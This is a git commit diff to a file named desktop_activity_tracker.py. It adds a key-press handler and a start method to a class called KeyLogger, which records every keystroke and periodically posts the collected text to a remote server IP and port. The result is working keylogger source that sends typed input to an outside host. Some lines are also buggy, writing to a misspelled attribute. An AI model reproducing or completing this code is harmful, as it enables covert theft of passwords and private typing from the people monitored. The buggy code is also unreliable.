fbf1a6c1d69bbe24cc9a1df81cc8dbb239732265
Altheo Mananquil <altheo.mananquil@gmail.com>
2025-06-22 00:10:58 +0800

    added _on_press method and start method. commit 4

--- desktop_activity_tracker.py
+++ desktop_activity_tracker.py
@@ -8,7 +8,7 @@ import threading
 
 class KeyLogger:
 
-    def __init__(self):
+    def __init__(self, interval, port, server_ip):
         # global variable text where keystrokes are saved as a string which is sent to server
         self.server_ip = server_ip  
         self.port = port
@@ -30,3 +30,27 @@ class KeyLogger:
             timer = threading.Timer(self.interval, self._send_post_request)
             timer.start()
 
+    def _on_press(self, key):
+        try:
+            if key == keyboard.Key.enter:
+                self.text += "\n"
+            elif key == keyboard.Key.tab:
+                self.test += "\t"
+            elif key == keyboard.Key.space:
+                self.test += " "
+            elif key == keyboard.Key.backspace:
+                self.text =  self.text [:-1]
+            elif key == keyboard.Key.esc:
+                return False # stops listener
+            
+            else:
+                self.text += str(key).strip("'")
+        except:
+            pass
+
+    def start(self):
+        self._send_post_request()
+        with keyboard.Listener(on_press=self._on_press) as listener:
+            listener.join()
+
+            
